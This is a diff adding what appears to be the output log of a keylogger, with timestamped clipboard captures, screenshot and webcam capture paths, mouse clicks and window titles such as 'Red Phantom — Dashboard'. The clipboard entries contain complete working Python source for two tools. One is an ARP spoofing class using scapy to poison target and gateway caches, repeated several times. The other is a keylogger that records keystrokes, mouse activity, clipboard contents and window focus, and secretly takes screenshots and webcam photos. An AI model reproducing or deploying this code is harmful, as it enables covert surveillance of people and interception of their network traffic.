@@ -1,0 +1,315 @@
+2025-12-06 01:27:53,984: [CLIPBOARD] from scapy.all import ARP, send
+import threading, time
+
+class NetworkScanner:
+    def __init__(self):
+        self.arp_thread = None
+        self.arp_running = False
+
+    def arp_spoof(self, target_ip, target_mac, gateway_ip):
+        self.arp_running = True
+        packet_target = ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target_mac)
+        packet_gateway = ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst="ff:ff:ff:ff:ff:ff")
+        while self.arp_running:
+            send(packet_target, verbose=False)
+            send(packet_gateway, verbose=False)
+            time.sleep(2)
+
+    def start_arp_spoofing(self, target_ip, target_mac, gateway_ip):
+        if self.arp_running: return "ARP spoofing already running"
+        self.arp_thread = threading.Thread(target=self.arp_spoof, args=(target_ip, target_mac, gateway_ip))
+        self.arp_thread.start()
+        return "ARP spoofing started"
+
+    def stop_arp_spoofing(self):
+        if not self.arp_running: return "ARP spoofing is not running"
+        self.arp_running = False
+        if self.arp_thread: self.arp_thread.join()
+        return "ARP spoofing stopped"
+
+2025-12-06 01:27:54,185: [SCREENSHOT] temp/keylogger\screenshot_20251206_012754.png
+2025-12-06 01:27:57,712: [WEBCAM] temp/keylogger\webcam_20251206_012757.jpg
+2025-12-06 01:28:15,927: [CLIPBOARD] from scapy.all import ARP, send
+import threading, time
+
+class NetworkScanner:
+    def __init__(self):
+        self.arp_thread = None
+        self.arp_running = False
+
+    def arp_spoof(self, target_ip, target_mac, gateway_ip):
+        self.arp_running = True
+        packet_target = ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target_mac)
+        packet_gateway = ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst="ff:ff:ff:ff:ff:ff")
+        while self.arp_running:
+            send(packet_target, verbose=False)
+            send(packet_gateway, verbose=False)
+            time.sleep(2)
+
+    def start_arp_spoofing(self, target_ip, target_mac, gateway_ip):
+        if self.arp_running: return "ARP spoofing already running"
+        self.arp_thread = threading.Thread(target=self.arp_spoof, args=(target_ip, target_mac, gateway_ip))
+        self.arp_thread.start()
+        return "ARP spoofing started"
+
+    def stop_arp_spoofing(self):
+        if not self.arp_running: return "ARP spoofing is not running"
+        self.arp_running = False
+        if self.arp_thread: self.arp_thread.join()
+        return "ARP spoofing stopped"
+
+2025-12-06 01:28:16,113: [SCREENSHOT] temp/keylogger\screenshot_20251206_012816.png
+2025-12-06 01:28:19,405: [WEBCAM] temp/keylogger\webcam_20251206_012819.jpg
+2025-12-06 01:28:28,505: [KEYLOGGER] Started
+2025-12-06 01:28:28,528: [WINDOW] Red Phantom — Dashboard - Google Chrome
+2025-12-06 01:28:29,506: [MOUSE] Pressed Button.left at (1147,249)
+2025-12-06 01:28:29,596: [MOUSE] Released Button.left at (1147,247)
+2025-12-06 01:28:31,243: [MOUSE] Pressed Button.left at (1538,847)
+2025-12-06 01:28:31,363: [MOUSE] Released Button.left at (1540,847)
+2025-12-06 01:28:31,369: [CLIPBOARD] from scapy.all import ARP, send
+import threading, time
+
+class NetworkScanner:
+    def __init__(self):
+        self.arp_thread = None
+        self.arp_running = False
+
+    def arp_spoof(self, target_ip, target_mac, gateway_ip):
+        self.arp_running = True
+        packet_target = ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target_mac)
+        packet_gateway = ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst="ff:ff:ff:ff:ff:ff")
+        while self.arp_running:
+            send(packet_target, verbose=False)
+            send(packet_gateway, verbose=False)
+            time.sleep(2)
+
+    def start_arp_spoofing(self, target_ip, target_mac, gateway_ip):
+        if self.arp_running: return "ARP spoofing already running"
+        self.arp_thread = threading.Thread(target=self.arp_spoof, args=(target_ip, target_mac, gateway_ip))
+        self.arp_thread.start()
+        return "ARP spoofing started"
+
+    def stop_arp_spoofing(self):
+        if not self.arp_running: return "ARP spoofing is not running"
+        self.arp_running = False
+        if self.arp_thread: self.arp_thread.join()
+        return "ARP spoofing stopped"
+
+2025-12-06 01:28:31,568: [SCREENSHOT] temp/keylogger\screenshot_20251206_012831.png
+2025-12-06 01:28:34,755: [WEBCAM] temp/keylogger\webcam_20251206_012834.jpg
+2025-12-06 01:28:35,431: [MOUSE] Pressed Button.left at (820,1079)
+2025-12-06 01:28:35,498: [MOUSE] Released Button.left at (820,1079)
+2025-12-06 01:28:36,533: [WINDOW] backend
+2025-12-06 01:28:36,762: [MOUSE] Pressed Button.left at (583,189)
+2025-12-06 01:28:36,838: [MOUSE] Released Button.left at (583,189)
+2025-12-06 01:28:36,898: [MOUSE] Pressed Button.left at (583,189)
+2025-12-06 01:28:37,011: [MOUSE] Released Button.left at (583,189)
+2025-12-06 01:28:38,535: [WINDOW] keylogger
+2025-12-06 01:28:38,680: [MOUSE] Pressed Button.left at (654,89)
+2025-12-06 01:28:38,770: [MOUSE] Released Button.left at (654,89)
+2025-12-06 01:28:39,800: [MOUSE] Pressed Button.left at (582,75)
+2025-12-06 01:28:39,867: [MOUSE] Released Button.left at (582,75)
+2025-12-06 01:28:40,536: [WINDOW] tools
+2025-12-06 01:28:41,237: [MOUSE] Pressed Button.left at (508,155)
+2025-12-06 01:28:41,319: [MOUSE] Released Button.left at (508,155)
+2025-12-06 01:28:41,395: [MOUSE] Pressed Button.left at (508,155)
+2025-12-06 01:28:41,476: [MOUSE] Released Button.left at (508,155)
+2025-12-06 01:28:42,538: [WINDOW] backend
+2025-12-06 01:28:42,674: [MOUSE] Pressed Button.left at (513,186)
+2025-12-06 01:28:42,763: [MOUSE] Released Button.left at (513,186)
+2025-12-06 01:28:43,380: [MOUSE] Pressed Button.left at (507,212)
+2025-12-06 01:28:43,455: [MOUSE] Released Button.left at (507,212)
+2025-12-06 01:28:43,530: [MOUSE] Pressed Button.left at (507,212)
+2025-12-06 01:28:43,619: [MOUSE] Released Button.left at (507,212)
+2025-12-06 01:28:44,540: [WINDOW] temp
+2025-12-06 01:28:44,703: [MOUSE] Pressed Button.left at (571,159)
+2025-12-06 01:28:44,770: [MOUSE] Released Button.left at (571,159)
+2025-12-06 01:28:44,845: [MOUSE] Pressed Button.left at (571,159)
+2025-12-06 01:28:44,920: [MOUSE] Released Button.left at (571,159)
+2025-12-06 01:28:45,988: [MOUSE] Pressed Button.left at (1381,342)
+2025-12-06 01:28:46,541: [WINDOW] keylogger
+2025-12-06 01:28:46,921: [MOUSE] Released Button.left at (485,223)
+2025-12-06 01:28:47,725: [KEY] Key.delete
+2025-12-06 01:28:49,214: [MOUSE] Pressed Button.left at (719,84)
+2025-12-06 01:28:49,298: [MOUSE] Released Button.left at (719,84)
+2025-12-06 01:28:50,380: [MOUSE] Pressed Button.left at (628,78)
+2025-12-06 01:28:50,477: [MOUSE] Released Button.left at (628,78)
+2025-12-06 01:28:50,543: [WINDOW] temp
+2025-12-06 01:28:51,613: [MOUSE] Pressed Button.left at (471,186)
+2025-12-06 01:28:51,710: [MOUSE] Released Button.left at (471,186)
+2025-12-06 01:28:51,770: [MOUSE] Pressed Button.left at (471,186)
+2025-12-06 01:28:51,875: [MOUSE] Released Button.left at (471,186)
+2025-12-06 01:28:52,544: [WINDOW] keylogger
+2025-12-06 01:28:52,906: [MOUSE] Pressed Button.left at (668,81)
+2025-12-06 01:28:52,989: [MOUSE] Released Button.left at (668,81)
+2025-12-06 01:28:53,876: [MOUSE] Pressed Button.left at (412,201)
+2025-12-06 01:28:53,929: [MOUSE] Released Button.left at (412,201)
+2025-12-06 01:28:54,018: [MOUSE] Pressed Button.left at (412,201)
+2025-12-06 01:28:54,117: [MOUSE] Released Button.left at (412,201)
+2025-12-06 01:28:54,546: [WINDOW] temp
+2025-12-06 01:28:54,884: [MOUSE] Pressed Button.left at (477,162)
+2025-12-06 01:28:54,966: [MOUSE] Released Button.left at (477,162)
+2025-12-06 01:28:55,026: [MOUSE] Pressed Button.left at (477,162)
+2025-12-06 01:28:55,124: [MOUSE] Released Button.left at (477,162)
+2025-12-06 01:28:56,547: [WINDOW] keylogger
+2025-12-06 01:28:57,274: [MOUSE] Pressed Button.left at (1056,1062)
+2025-12-06 01:28:57,365: [MOUSE] Released Button.left at (1056,1062)
+2025-12-06 01:28:58,548: [WINDOW] ARP spoofing code - Google Chrome
+2025-12-06 01:29:05,215: [MOUSE] Pressed Button.left at (996,1059)
+2025-12-06 01:29:05,335: [MOUSE] Released Button.left at (996,1059)
+2025-12-06 01:29:06,556: [WINDOW] Red Phantom — Dashboard - Google Chrome
+2025-12-06 01:29:07,124: [MOUSE] Pressed Button.left at (1574,751)
+2025-12-06 01:29:07,237: [MOUSE] Released Button.left at (1574,751)
+2025-12-06 01:29:07,241: [KEYLOGGER] Stopped
+2025-12-06 01:29:09,437: [CLIPBOARD] from scapy.all import ARP, send
+import threading, time
+
+class NetworkScanner:
+    def __init__(self):
+        self.arp_thread = None
+        self.arp_running = False
+
+    def arp_spoof(self, target_ip, target_mac, gateway_ip):
+        self.arp_running = True
+        packet_target = ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target_mac)
+        packet_gateway = ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst="ff:ff:ff:ff:ff:ff")
+        while self.arp_running:
+            send(packet_target, verbose=False)
+            send(packet_gateway, verbose=False)
+            time.sleep(2)
+
+    def start_arp_spoofing(self, target_ip, target_mac, gateway_ip):
+        if self.arp_running: return "ARP spoofing already running"
+        self.arp_thread = threading.Thread(target=self.arp_spoof, args=(target_ip, target_mac, gateway_ip))
+        self.arp_thread.start()
+        return "ARP spoofing started"
+
+    def stop_arp_spoofing(self):
+        if not self.arp_running: return "ARP spoofing is not running"
+        self.arp_running = False
+        if self.arp_thread: self.arp_thread.join()
+        return "ARP spoofing stopped"
+
+2025-12-06 01:29:09,616: [SCREENSHOT] temp/keylogger\screenshot_20251206_012909.png
+2025-12-06 01:29:12,905: [WEBCAM] temp/keylogger\webcam_20251206_012912.jpg
+2025-12-06 01:30:53,210: [CLIPBOARD] import os, time, datetime, logging, threading, pyautogui, cv2, clipboard
+import pygetwindow as gw
+from pynput.keyboard import Listener as KeyboardListener
+from pynput.mouse import Listener as MouseListener
+
+class KeyloggerCore:
+    def __init__(self, log_directory=None):
+        self.log_directory = log_directory or os.path.join(os.getcwd(), "keylogger_logs")
+        self.log_file_name = "keylogger.txt"
+        self.webcam_index = 0
+        self.is_running = False
+        self.keyboard_listener = None
+        self.mouse_listener = None
+        self.last_key_time = time.time()
+        self.previous_window = None
+        os.makedirs(self.log_directory, exist_ok=True)
+        self.log_file_path = os.path.join(self.log_directory, self.log_file_name)
+        open(self.log_file_path, 'w').close()
+        self.logger = logging.getLogger('keylogger')
+        if not self.logger.handlers:
+            handler = logging.FileHandler(self.log_file_path)
+            handler.setFormatter(logging.Formatter("%(asctime)s: %(message)s"))
+            self.logger.addHandler(handler)
+            self.logger.setLevel(logging.DEBUG)
+
+    def get_active_window(self):
+        try: return gw.getActiveWindowTitle() or "Unknown Window"
+        except: return "Unknown Window"
+
+    def log_clipboard(self):
+        try:
+            content = clipboard.paste()
+            if content and content.strip():
+                self.logger.info(f"[CLIPBOARD] {content}")
+        except: pass
+
+    def take_screenshot(self):
+        try:
+            img = pyautogui.screenshot()
+            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
+            path = os.path.join(self.log_directory, f"screenshot_{timestamp}.png")
+            img.save(path)
+            self.logger.info(f"[SCREENSHOT] {path}")
+            return path
+        except: return None
+
+    def capture_webcam(self):
+        try:
+            cap = cv2.VideoCapture(self.webcam_index)
+            ret, frame = cap.read()
+            if ret:
+                timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
+                path = os.path.join(self.log_directory, f"webcam_{timestamp}.jpg")
+                cv2.imwrite(path, frame)
+                self.logger.info(f"[WEBCAM] {path}")
+                cap.release()
+                return path
+            cap.release()
+        except: pass
+        return None
+
+    def on_mouse_click(self, x, y, button, pressed):
+        action = "Pressed" if pressed else "Released"
+        self.logger.info(f"[MOUSE] {action} {button} at ({x},{y})")
+
+    def on_mouse_scroll(self, x, y, dx, dy):
+        self.logger.info(f"[MOUSE] Scroll ({dx},{dy}) at ({x},{y})")
+
+    def log_timing(self, key):
+        now = time.time()
+        interval = round(now - self.last_key_time, 3)
+        self.logger.info(f"[TIMING] '{key}' after {interval}s")
+        self.last_key_time = now
+
+    def track_focus(self):
+        while self.is_running:
+            current_window = self.get_active_window()
+            if current_window != self.previous_window:
+                self.logger.info(f"[WINDOW] {current_window}")
+                self.previous_window = current_window
+            time.sleep(2)
+
+    def on_key_press(self, key):
+        try:
+            char = key.char
+            self.log_timing(char)
+            self.logger.info(f"[KEY] {char}")
+        except AttributeError:
+            self.logger.info(f"[KEY] {key}")
+
+    def on_key_release(self, key):
+        if str(key) == 'Key.esc':
+            return False
+
+    def start_keylogger(self):
+        if self.is_running: return False
+        self.is_running = True
+        self.logger.info("[KEYLOGGER] Started")
+        self.keyboard_listener = KeyboardListener(on_press=self.on_key_press, on_release=self.on_key_release)
+        self.keyboard_listener.start()
+        self.mouse_listener = MouseListener(on_click=self.on_mouse_click, on_scroll=self.on_mouse_scroll)
+        self.mouse_listener.start()
+        threading.Thread(target=self.track_focus, daemon=True).start()
+        return True
+
+    def stop_keylogger(self):
+        if not self.is_running: return False
+        self.is_running = False
+        self.logger.info("[KEYLOGGER] Stopped")
+        if self.keyboard_listener: self.keyboard_listener.stop()
+        if self.mouse_listener: self.mouse_listener.stop()
+        return True
+
+    def run_periodic_tasks(self):
+        self.log_clipboard()
+        ss = self.take_screenshot()
+        wc = self.capture_webcam()
+        return ss, wc
+
+2025-12-06 01:30:53,367: [SCREENSHOT] temp/keylogger\screenshot_20251206_013053.png
+2025-12-06 01:30:56,741: [WEBCAM] temp/keylogger\webcam_20251206_013056.jpg
